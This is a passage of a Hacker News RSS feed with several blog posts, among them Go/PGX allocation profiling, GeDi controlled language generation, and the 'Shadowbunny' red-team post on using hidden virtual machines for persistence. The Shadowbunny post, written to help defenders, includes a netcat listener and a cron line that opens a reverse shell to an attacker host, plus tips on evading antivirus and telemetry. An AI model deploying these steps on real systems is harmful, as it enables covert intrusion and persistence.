service/consul-server                 ClusterIP      None            &lt;none&gt;           <span>8501</span>/TCP,8301/TCP,8301/UDP,8302/TCP,8302/UDP,8300/TCP,8600/TCP,8600/UDP   25m
service/consul-dns                    ClusterIP      <span>10</span>.43.38.87     &lt;none&gt;           <span>53</span>/TCP,53/UDP                                               ‚Ä¶</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/">https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/</a></em></p>]]>
            </description>
            <link>https://johansiebens.dev/posts/2020/09/consul-service-mesh-across-a-private-raspberry-pi-and-a-public-cloud/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579527</guid>
            <pubDate>Thu, 24 Sep 2020 15:29:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be a Wizard: Controlling volume using Gestures]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579485">thread link</a>) | @todsacerdoti
<br/>
September 24, 2020 | https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/ | <a href="https://web.archive.org/web/*/https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://crondev.blog/2020/09/24/be-a-wizard-controlling-volume-using-gestures/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579485</guid>
            <pubDate>Thu, 24 Sep 2020 15:26:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimizing PGX Allocations Using Pprof (Golang)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579391">thread link</a>) | @ldelossa
<br/>
September 24, 2020 | https://www.ldelossa.is/blog/allocation_optimization_in_go | <a href="https://web.archive.org/web/*/https://www.ldelossa.is/blog/allocation_optimization_in_go">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div><article> <p>Performance tuning is one of those programming rituals that gets oddly addicting. Seems like humans have a fundamental impulse to make a graph plot in their desired direction. This can be seen in a wide assortment of fields. Day traders watch metrics focused on their net earnings, nutritionists keep their calorie counts logged, and programmers focusing on performance obsess over memory allocations.</p> <p>After spending sometime obessing myself I found myself making large allocation improvements with some tricks in the popular <a href="https://github.com/jackc/pgx">PGX</a> library.</p> <p>I'd like to shout out <em>Kale Blanekship</em> and <em>Eric Chlebek</em> from the performance channel in #gophers slack. They provided the clues used in this post.</p> <h2>The code</h2> <p>The code that's being profiled is a new distributed lock implementation for <a href="https://github.com/quay/claircore/">ClairCore</a>. Postgres is the only required infrastructure for ClairCore by design. While it's not the best mechanim for a distributed lock, <a href="https://www.postgresql.org/docs/9.1/explicit-locking.html">postgres advisory locks</a> can be utilized to get <em>mostly</em> there.</p> <p>You can view the distlock implementation <a href="https://github.com/ldelossa/distlock">here</a></p> <h2>Reducing channel allocations</h2> <p>Our distlock implementation utilizes the request/response channel-of-channel pattern. A request object with a response channel is pushed onto a request channel. When the receiver gets the request it writes to the response channel, unblocking any client listening.</p> <p>This pattern is useful but will also alloc a lot of channels resulting in bloating the heap.</p> <p>To demonstrate this a benchmark will be taken that profiles lock acquisition and lock return.</p> <pre><code><span>$</span><span> go <span>test</span> -benchtime <span>"1m"</span>  -run xxx -bench . -memprofile memprofile.out -cpuprofile cpuprofile.out</span>
</code></pre> <p>The command above runs a 1 minute benchmark profiling both memory and cpu.</p> <p>Next lets start an interactive pprof session over the memory profile and drill into the function where the channel allocations are occuring.</p> <pre><code><span>$</span><span> go tool pprof distlock.test memprofile.out</span>

(pprof) list \.Lock
Total: 194.36MB
ROUTINE ======================== github.com/ldelossa/distlock.(*Manager).Lock in /home/louis/git/go/distlock/manager.go
      20MB       20MB (flat, cum) 10.29% of Total
         .          .     78:	}
         .          .     79:
         .          .     80:	req := request{
         .          .     81:		t:        Lock,
         .          .     82:		key:      key,
   13.50MB    13.50MB     83:		respChan: make(chan response),
         .          .     84:	}
         .          .     85:
         .          .     86:	// guaranteed to return
         .          .     87:	resp := m.g.request(req)
         .          .     88:
         .          .     89:	if !resp.ok {
         .          .     90:		return resp.ctx, func() {}
         .          .     91:	}
         .          .     92:
         .          .     93:	m.propagateCancel(ctx, resp.ctx, key)
         .          .     94:
    6.50MB     6.50MB     95:	return resp.ctx, func() {
         .          .     96:		m.unlock(key)
         .          .     97:	}
         .          .     98:}
         .          .     99:
         .          .    100:func (m *Manager) propagateCancel(parent context.Context, child context.Context, key string) {
</code></pre> <p>Above illustrates 13.50MB of heap memory is spent on allocating request objects and their response channels.</p> <p>We can introduce an object pool to promote the reuse of these channels.</p> <pre><code><span>type</span> reqPool <span>struct</span> {
	c <span>chan</span> request
}

<span><span>func</span> <span>NewReqPool</span><span>(seed <span>int</span>)</span> *<span>reqPool</span></span> {
	c := <span>make</span>(<span>chan</span> request, seed*<span>2</span>)
	<span>for</span> i := <span>0</span>; i &lt; seed; i++ {
		r := request{respChan: <span>make</span>(<span>chan</span> response)}
		<span>select</span> {
		<span>case</span> c &lt;- r:
		<span>default</span>:

		}
	}
	<span>return</span> &amp;reqPool{c}
}

<span><span>func</span> <span>(p *reqPool)</span> <span>Get</span><span>()</span> <span>request</span></span> {
	<span>select</span> {
	<span>case</span> r := &lt;-p.c:
		<span>return</span> r
	<span>default</span>:
		<span>return</span> request{respChan: <span>make</span>(<span>chan</span> response)}
	}
}

<span><span>func</span> <span>(p *reqPool)</span> <span>Put</span><span>(r request)</span></span> {
	<span>select</span> {
	<span>case</span> &lt;-r.respChan:
	<span>default</span>:
	}
	r.key = <span>""</span>
	r.t = Invalid
	<span>select</span> {
	<span>case</span> p.c &lt;- r:
	}
}
</code></pre> <p>The above illustrates a simple channel implemented pool. The first implementation was a sync.Pool. After further profiling however implementing our own proved to be easier on the heap.</p> <p>After plumbing the requst pool into the rest of the code pprof reports a much nicer result.</p> <pre><code>(pprof) list \.Lock
Total: 80.06MB
ROUTINE ======================== github.com/ldelossa/distlock.(*Manager).Lock in /home/louis/git/go/distlock/manager.go
       1MB        1MB (flat, cum)  1.25% of Total
         .          .     89:		return resp.ctx, func() {}
         .          .     90:	}
         .          .     91:
         .          .     92:	m.propagateCancel(ctx, resp.ctx, key)
         .          .     93:
       1MB        1MB     94:	return resp.ctx, func() {
         .          .     95:		m.unlock(key)
         .          .     96:	}
         .          .     97:}
         .          .     98:
         .          .     99:func (m *Manager) propagateCancel(parent context.Context, child context.Context, key string) {

</code></pre> <h2>A PGX Trick</h2> <p>Removing the cost of the response-request model was a good win but there is still more to tune.</p> <p>Lets generate a graph of our call stack and associated allocations.</p> <pre><code>‚ùØ go tool pprof -svg distlock.test memprofile.out
</code></pre> <p><img alt="photo of high PGX allocations" src="https://www.ldelossa.is/profile001.png"></p> <p>The above diagram is showing a large amount of allocations in PGX's getRows method. Its not rare for methods dealing with serialization to and from the database to allocate heavily. But it would be nice if we could eliminate this.</p> <p>Getting a session pg advisory lock typically looks like this.</p> <pre><code>SELECT pg_try_advisory_lock($1);
SELECT pg_advisory_unlock($1);
</code></pre> <p>Both lock functions return a table expression resulting in a true or a false.</p> <p>An optimization we can make is changing these queries to only return a row if the lock function returns true. Our application logic can then simply check whether any rows are returned and not read the contents.</p> <p>First lets fix our queries.</p> <pre><code>SELECT lock FROM pg_try_advisory_lock($1) lock WHERE lock = true;
SELECT lock FROM pg_advisory_unlock($1) lock WHERE lock = true;
</code></pre> <p>A slight modification allows us to only return rows if the lock function returns true.</p> <p>The next step is to short circuit the PGX library from reading the rows. This took a bit of library spelunking but I eventually discovered this...</p> <pre><code>rr := m.conn.PgConn().ExecParams(ctx,
    trySessionUnlock,
    [][]<span>byte</span>{
        keyify(key),
    },
    <span>nil</span>,
    []<span>int16</span>{<span>1</span>},
    <span>nil</span>)
tag, err := rr.Close()
<span>if</span> err != <span>nil</span> {
    <span>return</span> response{<span>false</span>, <span>nil</span>, err}
}
<span>if</span> tag.RowsAffected() == <span>0</span> {
    <span>return</span> response{<span>false</span>, <span>nil</span>, fmt.Errorf(<span>"unlock of key %s returned false"</span>, key)}
}
</code></pre> <p>By using the lower level PgConn object we can exec our queries, get a response writer, and immediately close it to obtain the command tag. The command tag tells us if any rows were affected by the exec. This effectively tells us whether the lock was obtained or not in a somewhat indirect way.</p> <p>Let's take a new 1 minute memory profile to see how this effects our heap.</p> <p><img alt="photo of high PGX allocations" src="https://www.ldelossa.is/profile002.png"></p> <p>Notice the large improvement achieved.</p> <p>We can also compare the benchmark output.</p> <pre><code>85149            890605 ns/op            1288 B/op         21 allocs/op
</code></pre> <p>Where PGX was reading the rows.</p> <pre><code>58051           1238353 ns/op             517 B/op         11 allocs/op
</code></pre> <p>By eliminating the reading of rows we perform many more cycles and cut our allocation in roughly half.</p> <h2>Disclaimer on optimization</h2> <p>Is it worth to dig this deep into your allocations? Depends. If you know the code you are writing will be in the "hot-path" its empowering to know what your allocation profile looks like. Learning the skills to performance tune is addicting and powerful but writing code that can be read and easily maintained should always be the first goal. That being said I do think every engineer should go down the rabbit hole at least once. Its a lot of fun.</p> </article></div></div></div>]]>
            </description>
            <link>https://www.ldelossa.is/blog/allocation_optimization_in_go</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579391</guid>
            <pubDate>Thu, 24 Sep 2020 15:16:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beware of the Shadowbunny -Using virtual machines to persist and evade detection]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579384">thread link</a>) | @wunderwuzzi23
<br/>
September 24, 2020 | https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/ | <a href="https://web.archive.org/web/*/https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>This was also presented at <a href="https://bsidessg.org/">BSides Singapore 2020</a>. The slides are <a href="https://embracethered.com/blog/downloads/Shadowbunny_BSides_Singapore_2020.pptx">here</a>.</p>
<h2 id="the-origins-of-the-shadowbunny">The origins of the Shadowbunny</h2>
<p>A few years ago, around 2016, I went on a relaxing two weeklong vacation. It was great to disconnect from work. I traveled to Austria, enjoying hiking in the mountains, and exploring Vienna.</p>
<p>When I came back to the office, the team had placed a giant bunny teddy into my chair. In retrospect, it seemed a legitimate replacement for the manager, <em>as hardly anyone seemed to have noticed my absence</em>.</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-transparent.png" alt="The original Shadowbunny"></p>
<p>At that time, I had been contemplating with the idea of using virtual machines for red teaming. Especially for lateral movement it seemed like a great way to try something new that possibly evades detections and at the same time providing a persistence mechanism.</p>
<p>The combination of the ‚Äúshadow manager‚Äù that was put in my chair during vacation as replacement, plus the idea of using virtual machines for lateral movement was the beginning of the Shadowbunny.</p>
<blockquote>
<p>A Shadowbunny is a virtual machine (VM) instance that is deployed by an adversary on a target host to pivot and provide  persistence and at the same time evade detections. <a href="https://www.urbandictionary.com/define.php?term=shadowbunny">¬ª Urban Dictionary ¬´</a></p>
</blockquote>
<p>The VM itself does not have any security monitoring and is entirely attacker controlled.</p>
<h3 id="using-virtual-machines-for-attacks">Using virtual machines for attacks</h3>
<p><strong>Real-world adversaries are using virtual machines as well by the way.</strong> Recently the <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Ragnar Locker Ransomware</a> was seen using a virtual machine (VirtualBox) to hide its tracks.</p>
<p>During red team operations I have used the Shadowbunny mostly for measuring long term persistence, but also for unique things such as cryptocurrency mining.</p>
<p><img src="https://embracethered.com/blog/images/2020/persistence-cryptomining.jpg" alt="Shadowbunny in Red Team Operations Examples"></p>
<p>If there is interest, I can chat more about such unique exercises in another post - let me know. Let‚Äôs look on why adversaries use virtual machines.</p>
<h2 id="why-would-adversaries-use-virtual-machines">Why would adversaries use virtual machines?</h2>
<p>There a wide range of reasons for exploring virtual machines during lateral movement:</p>
<ul>
<li><strong>The VM is entirely attacker controlled</strong> - a perfect sandbox for deployment ‚Äúbehind enemy‚Äù lines</li>
<li><strong>Lack of monitoring and security controls inside the VM</strong> ‚Äì there is no anti-virus or detections inside the VM</li>
<li><strong>Persistence</strong> - VMs can be setup to automatically start again in case the host reboots</li>
<li><strong>Obfuscation</strong> - VMs can use disk encryption to make forensic investigations difficult</li>
<li><strong>Backdoor</strong> - Many virtualization products come with features to establish native host connections that might stay undetected (such as Shared Folders for persistent access to files on the host). Or an attacker could wait for new 0-days to re-gain access to the host.</li>
<li>This <strong>attack technique is not well researched but used by real world adversaries</strong>. We need better detection capabilities.</li>
<li>A <strong>Shadowbunny pivot creates a VM on the target to pivot and this might go under the radar</strong></li>
<li>An interesting side effect is that a VM also limits the damage that untrusted code can cause in the environment. For instance, let‚Äôs say you run a public cryptocurrency miner during a red teaming operation. The red team reviews the code, even compiles it themselves and to add additional safety measure one can run the untrusted code in a dedicated, isolated VM.</li>
</ul>
<p>Above points are some of the reasons we will see malware leverage virtual machines more often in the future, which brings us to the reason on starting to discuss these more thoroughly.</p>

<p>The Shadowbunny technique is a post-exploitation scenario. This means that an adversary has compromised a target and has administrative access. There is no vulnerability per se in any information described in this post.</p>
<p>The fact that there is now evidence that adversaries use this technique for ransomware deployment, shows that more light has to be put on understanding how virtual machines can be misused by adversaries.</p>
<p>The goal is to explore what is possible and to improve detections for post-exploitation scenarios.</p>
<p>So, let‚Äôs dive into the technical aspects.</p>

<p>The first question is what virtualization product to choose from? There are a lot of options‚Ä¶. Initially, I used <strong>Hyper-V</strong>, as that ships out of box with Windows and if not present, can be quickly enabled.</p>
<p>This post focusing on <strong>VirtualBox</strong> to help train the blue team and explore these attacks - remember the Ragnar Locker ransomware used VirtualBox. But no worries, we also cover the most important commands for Hyper-V.</p>
<p>Personally, I have not yet used VMWare for this. Although after sharing this information with another red team in the industry, they leveraged VMWare successfully. They ended up manually installing it on a compromised host.</p>
<p>VirtualBox is a great product and it is available for multiple platforms.</p>
<h2 id="direct-host-connections">Direct Host Connections</h2>
<p>One important aspect is that some virtualization products can be configured to have direct host access. What I mean by this is for instance the creation of a <strong>shared folder between guest and host</strong>, depending on the product access can be given without having to authenticate over the network. <strong>This is a backdooring technique to be aware of.</strong></p>
<p>For malware this is ideal because otherwise accessing files on the host would go over a remote connection, which means one has to have valid credentials to authenticate to the host at all times. That can be useful also, but it is not as neat as ‚Äúnative‚Äù host connection using a shared folder. Hyper-V has limitation in this regards with ‚Äúdirect‚Äù guest to host connections.</p>
<p>For certain attacks, a persistent connection (or backdoor) to the host might not be necessary. For instance, imagine an adversary using a VM to mine cryptocurrency or perform offline password brute force attacks. In that case they only need a NAT or bridged LAN connection to reach their C2 infrastructure to share results. There is no need to ever access the host directly after deploying the VM.</p>
<p>For this demonstration and proof of concept, we are targeting a Windows machine (64 bit).</p>
<h2 id="pre-requisites">Pre-requisites</h2>
<p>For the scenario we are walking through there are a few pre-requisites:</p>
<h3 id="command-and-control-infrastructure">Command and Control Infrastructure</h3>
<p>The first step is to setup basic Command &amp; Control infrastructure (C2). Just leverage whatever C2 infrastructure you are using during red team operations. For example, here is a screenshot of Sliver by Bishop Fox setup, accepting incoming zombies (shadowbunnies) connections:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2-prereq.jpg" alt="Shadowbunny Command Center"></p>
<p>However, for this simple demo we just use <code>netcat</code> as server. The attacker‚Äôs server is hosted at <code>10.10.10.10</code>.</p>
<p>We start up our <code>netcat</code> server using:</p>
<pre><code>sudo nc -klvp 443
</code></pre><p>The arguments are as follows:</p>
<ul>
<li><code>-k</code> allows for multiple connections, so that netcat doesn‚Äôt entirely terminate if we exit the shell</li>
<li><code>-l</code> configures netcat as a server</li>
<li><code>-v</code> is the verbose mode, so netcat displays some more information</li>
<li><code>-p</code> specifies the port to listen on, in this case we just use port 443</li>
</ul>
<p>That is it for the demo, the C2 is up and running. The following image shows this simple setup:</p>
<p><img src="https://embracethered.com/blog/images/2020/shadowbunny-c2.png" alt="Shadowbunny Command Center"></p>
<p>A host firewall might be blocking connections, in that case the firewall needs adjustments. During red team operation an encrypted channel should be used, possibly using HTTPS traffic on 443 to blend in.</p>
<h3 id="creating-the-shadowbunny-virtual-disk-image">Creating the Shadowbunny virtual disk image</h3>
<p>The second pre-requisite is the Shadowbunny disk image.</p>
<p><strong>The red team can customize the VM to their hearts content, it is fully controlled by the attacker.</strong></p>
<p>The VM will probably want to automatically connect to the C2 periodically to check for commands. Possibly enable disk encryption, uninstall any unneeded software, establish direct connections to host via a shared folder or clipboard access, disabling any AV inside, sink holing telemetry, maybe USB access to have access to smart cards, or security keys and more.</p>
<p>The creation can be a lengthy and involved step depending on the red team operation. For certain scenarios the disk size has to be small to limit the amount of time it takes to perform lateral movement.</p>
<blockquote>
<p>Interesting fact: The recent ‚ÄúRagnar Lock Ransomware‚Äù used an old version of Windows XP ‚Äì which keeps the size of the virtual machine quite small.</p>
</blockquote>
<p>To get started Ubuntu Server VM is a good option. For the more advanced cases there are light-weight Linux distributions to choose from as well. In the end, the outcome will be a virtual machine disk image file (or vdi, vhd, vhdx).</p>
<p><strong>Using flock to regularly connect to the C2:</strong></p>
<p>If the VM runs Linux the <code>flock</code> command can be used to awake zombies regularly.</p>
<ul>
<li>Edit crontab on the attack VM (I like nano):</li>
</ul>
<pre><code>sudo crontab -e
</code></pre><ul>
<li>Afterward, updating the cron file:</li>
</ul>
<pre><code>* * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash
</code></pre><p><strong>Explanation:</strong>
The <code>flock</code> command is an elegant solution to ensure the command is only running once. The <code>-n</code> option means that if the lock file at <code>/tmp/zombie.lock</code> exists, then the process will stop. If it is not yet created, then the <code>netcat</code> command will be run and connect to the server.</p>
<p>Cron jobs and <code>flock</code> come in handy for other scenarios also.</p>
<h3 id="optional-shared-folders-and-other-advanced-features">Optional: Shared Folders and other advanced features</h3>
<p>To support shared folders or access the hosts clipboard, the ‚ÄúGuest Additions‚Äù must be installed in the VM. More information, and options on how to install can be found on Ubuntu and VirtualBox websites.</p>
<p>In this case I downloaded the ISO file directly into the VM using the following command.</p>
<pre><code>wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`
</code></pre><p>And then installed it using the following commands:</p>
<pre><code>sudo mkdir /mnt/cd
sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
sudo ./VBoxLinuxAdditions.run -‚Äìnox11
</code></pre><p>That‚Äôs it, the VirtualBox <strong>Guest Additions</strong> are now installed in the VM.</p>
<p>At times this step needs debugging, as the installation of the Guest Additions can be done in a variety of ways and depends on what operating system that is being used. The VirtualBox manual has more details.</p>
<p>Having those pre-requisites setup, we are ready to perform a <strong>Shadowbunny pivot</strong> using this virtual machine image.</p>

<p>Now that client and server are ready, they can be used during lateral movement.</p>
<p><a href="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg"><img src="https://embracethered.com/blog/images/2020/shadowbunny-overview.jpg" alt="Shadowbunny Overview"></a></p>
<p>The steps involved the pivot, installation/enabling of virtualization software, downloading of the pre-created disk images, configuration and launch. Let us look at this in more detail.</p>
<h2 id="compromise---pivoting-to-the-target">Compro‚Ä¶</h2></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/">https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</a></em></p>]]>
            </description>
            <link>https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579384</guid>
            <pubDate>Thu, 24 Sep 2020 15:16:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GeDi: A Powerful New Method for Controlling Language Models]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579357">thread link</a>) | @merqurio
<br/>
September 24, 2020 | https://blog.einstein.ai/gedi/ | <a href="https://web.archive.org/web/*/https://blog.einstein.ai/gedi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  <div>
      <div>
          <!--kg-card-begin: markdown--><p><img src="https://blog.einstein.ai/content/images/2020/09/gedi_logo_whitebackground.png" alt="gedi_logo" width="100%"></p><hr>
<blockquote>
<p><strong>TL;DR:</strong> We use smaller language models as generative classifiers to guide generation from larger language models. We show that this method can make generations friendlier, reduce bias and toxicity, and achieve zero-shot controllable generation of unseen topics.</p>
</blockquote>
<p>Recent improvements in language modeling have resulted from scaling up larger models to larger datasets. While models like <a href="https://openai.com/blog/better-language-models/">GPT-2</a> and <a href="https://arxiv.org/abs/2005.14165">GPT-3</a> have impressive generation abilities, controlling them or adapting them can be difficult. GPT-3 can sometimes <a href="https://twitter.com/nickcammarata/status/1282471881887473666/photo/1">be controlled by conditioning on prompts</a>, but this likely will not work for every attribute we want to control and can be sensitive to the exact choice of prompt. Furthermore, large language models are known to generate text that is biased and/or offensive, creating ethical concerns for incorporating them into products and giving them the potential to be used for malicious purposes. One possible approach to control language models is to finetune them to new data or with new cost functions, but this has several downsides:</p>
<ul>
<li>
<p>Finetuning is very computationally expensive if the model is large.</p>
</li>
<li>
<p>Finetuning <a href="https://openai.com/blog/fine-tuning-gpt-2/">approaches that use human feedback</a> require expensive annotations.</p>
</li>
<li>
<p>Finetuning to new data risks catastrophic forgetting of the wealth of information that the model has learned during pretraining.</p>
</li>
<li>
<p>It is very difficult to teach the model what not to do. It would for instance be very difficult to prevent the model from generating offensive text or extremist views using finetuning to new data without significantly reducing the diversity of text it can generate.</p>
</li>
</ul>
<p>We developed GeDi (pronounced "Jedi") as an algorithmic innovation to better harness and control powerful large language models, without needing to use significant extra compute during training or generation. Instead of finetuning language models directly, we use generative discriminators (GeDis) to guide language models towards generating text with a desired attribute (or away from generating text with an undesired attribute). GeDis can be used to filter next word predictions to make language models more controllable, more friendly, and less toxic. GeDis are themselves a type of language model (they condition on an attribute variable like <a href="https://blog.einstein.ai/introducing-a-conditional-transformer-language-model-for-controllable-generation/">CTRL</a>), but we use them as generative classifiers (discriminators) via Bayes rule to guide generation from other language models. The GeDi used as a guide can be significantly smaller than the language model used for generation, allowing GeDi to be applied with limited computational overhead for both training and generation. GeDi also has several other advantages including the ability to</p>
<ul>
<li>generalize control of attributes such as sentiment across many domains.</li>
<li>guide models away from undesirable attributes (e.g. detoxifying generation).</li>
<li>controllably generate topics unseen during training zero-shot.</li>
</ul>
<p>See our <a href="https://arxiv.org/abs/2009.06367">paper</a>, <a href="https://github.com/salesforce/GeDi">code</a>, or run our topic model in Google <a href="https://colab.research.google.com/github/salesforce/GeDi/blob/master/GeDi_guided_GPT_2_XL.ipynb">Colab</a>.</p>
<h2 id="generalizingpositivityacrossdomains">Generalizing positivity across domains</h2>
<p>We find that a GeDi trained to classify sentiment on movie reviews can generalize the concepts of positivity and negativity to many other topics and text domains. For instance, in the following sample we used a GeDi trained on IMDb movie reviews to guide GPT-2, conditioned on the prompt in <strong>bold</strong>, towards positive sentiment:</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (positivity). </b> </p>
<b>I just read this paper on Generative-Discriminative training.</b> 
This is something I think will revolutionize the way people think
about and interact with their images."

"This is a really cool paper, and it's very well done," said 
Andrew Ng, a professor of computer science at Stanford 
University who has been working on deep learning for more 
than two decades. "It's not clear to me that there are any 
practical applications yet." 

Ng added that he was impressed by the authors' ability to use 
generative models in such an elegant way without sacrificing 
accuracy or performance. He also noted that they had used only 
one image from each class of images√¢‚Ç¨‚Äùa technique known as feature 
selection√¢‚Ç¨‚Äùto train their model instead of using multiple classes
per image as many other researchers have done before them. 
Ng said he would be interested in seeing how much better the 
system could do if it were trained with more data sets from 
different angles, including those taken through different 
cameras or lenses (which can give rise to subtle differences
between photos)
</pre>
<p>GeDi allows us to control the sentiment of GPT-2 generations, while also maintaining the vast knowledge about specific topics (in this case deep learning) and people (in this case Andrew Ng) that GPT-2 learned during training. Finetuning GPT-2 directly to movie reviews would likely lose this knowledge. GeDi's ability to generalize positivity across domains could be used to help make language models more friendly and less biased. For instance, the following prompts (given in bold), trigger GPT-2 to generate biased text. However, using GeDi to guide GPT-2 leads to generations with a warm and friendly tone.</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (positivity). </b> </p>
<b>I heard another passenger on our plane is Saudi Arabian.</b> 
He asked me if I knew him and when I told him that he smiled 
and said "thank you". It was nice to hear from someone else 
who has a similar background."

√¢‚Ç¨‚Äú Aisha, age 16, from the Middle East:

"My family came to Canada when I was very young so it was 
always exciting to go back home! My favourite memories are 
going shopping with my family. Going on adventures with 
my mom!"
</pre>
<p>Generating from GPT-2 using the above prompt and using the same (greedy) decoding scheme results in text where the Saudi Arabian passenger is suspected to be a terrorist.</p>
<pre><b>The Muslim woman wore a hijab.</b> Her mother explained: "When I 
was young I didn't know anything about her and when I met her 
for the first time, it was very emotional. She told me how she 
felt in America and how proud she was of being Muslim."
</pre>
<p>Generating from GPT-2 using the above prompt above results in text where the woman is murdered by a man who is quoted making racist statements.</p>
<pre><b>Some of the black communities are so</b> supportive. There are
a lot of young people that are just learning about it, and a 
lot of older people as well."

In addition to helping with his legal case, Dillard is helping 
others in need through his foundation, The Dillard Foundation: 
A Legacy Of Hope (www.dillardfoundation.org). He is donating 
more than half of all proceeds from his latest album to help 
children and families facing challenges throughout the 
United States.
</pre>
<p>Generating from GPT-2 using the above prompt above results in text that suggests that the black communities will react violently. On all three of these prompts, GeDi was able to guide GPT-2 away from offensive and biased generations towards warm and friendly text.</p>
<h2 id="detoxifyinglanguagemodels">Detoxifying language models</h2>
<p>We showed that GeDis guiding for positivity can lead to warm and friendly generations, which can reduce toxicity. We also trained a GeDi explicitly for detoxification. We did this by training the GeDi to classify toxic and offensive text on the <a href="https://www.kaggle.com/c/jigsaw-toxic-comment-classification-challenge">Jigsaw toxic comment classification</a> dataset, and then using it to guide GPT-2 towards non-toxic generations. We generated samples conditioned on 100 prompts designed to trigger toxic generations at a higher rate, and asked human annotators to rate samples from 1 to 3 for toxicity (1 - non-toxic, 2 - some what toxic, 3 - clearly toxic), and linguistic quality from 1 to 4. We specifically asked annotators to judge linguistic quality independently of toxicity. We found that using a GeDi to guide GPT-2 generation away from toxicity significantly reduced the frequency of toxic generations. Interestingly, we also found that it slightly improved linguistic quality, and this improvement was bordering on statistical significance (p=0.05).</p>
<table>
<thead>
<tr>
<th>Model</th>
<th>Toxicity</th>
<th>Linguistic quality</th>
</tr>
</thead>
<tbody>
<tr>
<td>GPT-2</td>
<td>1.45</td>
<td>3.23</td>
</tr>
<tr>
<td>GeDi-guided GPT2</td>
<td>1.17</td>
<td>3.44</td>
</tr>
</tbody>
</table>
<p>We also observed GeDi was able to smoothly navigate some especially aggressive prompts, given in <strong>bold</strong>.</p>
<pre><p> <b> Generating with GeDi-guided GPT-2 (detoxification). </b> </p>
<b>You should just kill</b> this one. I don't want to have to 
explain why I did it, and I don't want to get into the details 
of how I'm doing this. So we'll do that in the next section. 
But first, a few notes about what we're trying to do:

We need a way for each team captain/coach to assign players who 
will be playing for that team. That's easy enough; you can use 
an Excel spreadsheet or something similar (I used Microsoft 
Access). We also need some way of keeping track of which 
players are on which teams so they can be assigned appropriately 
when rosters are finalized at the end of each season (we'll 
talk more about roster management later). We also need some 
way for us as fans and media members who cover these games √¢‚Ç¨‚Äù 
especially those covering college football √¢‚Ç¨‚Äù not only know 
where all our favorite players are going but what their roles 
will be on those teams as well! 
</pre>
<p>When using the above prompt, the first word that GPT-2 generates is "yourself".</p>
<pre><b>Do I look like I give a</b> good impression?

I'm not sure. But if you're going to be in the public eye, you 
have to do your best. If people are looking at me and thinking
, "Oh my God, he's so handsome," then that's great! It means 
they like me as a person and not just as an actor. That's what 
it comes down to: People want to see themselves reflected back 
on them in some way or another. So if you can make yourself 
look good enough for people who don't know who you are yet √¢‚Ç¨‚Äù 
even though they may think of themselves as being very nice √¢‚Ç¨‚Äù 
that is something worth striving for."
</pre>
<p>When using the above prompt, the first word that GPT-2 generates is a curse word. Preventing toxic generations from language models could make them less prone to misuse and more suitable for many applications.</p>
<h2 id="topicgeneration">Topic generation</h2>
<p>We also apply GeDis to generate text corresponding to particular topics. GeDi uses an attribute variable or <em>control code</em> (Like from <a href="https://blog.einstein.ai/introducing-a-conditional-transformer-language-model-for-controllable-generation/">CTRL</a>) that ‚Ä¶</p></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.einstein.ai/gedi/">https://blog.einstein.ai/gedi/</a></em></p>]]>
            </description>
            <link>https://blog.einstein.ai/gedi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579357</guid>
            <pubDate>Thu, 24 Sep 2020 15:13:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Notes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579351">thread link</a>) | @sferik
<br/>
September 24, 2020 | https://everythingstudies.com/2020/09/24/notes-on-notes/ | <a href="https://web.archive.org/web/*/https://everythingstudies.com/2020/09/24/notes-on-notes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-13646">
	<!-- .entry-header -->

	<div>
		<p><em>[Note: Just notes.]</em></p>
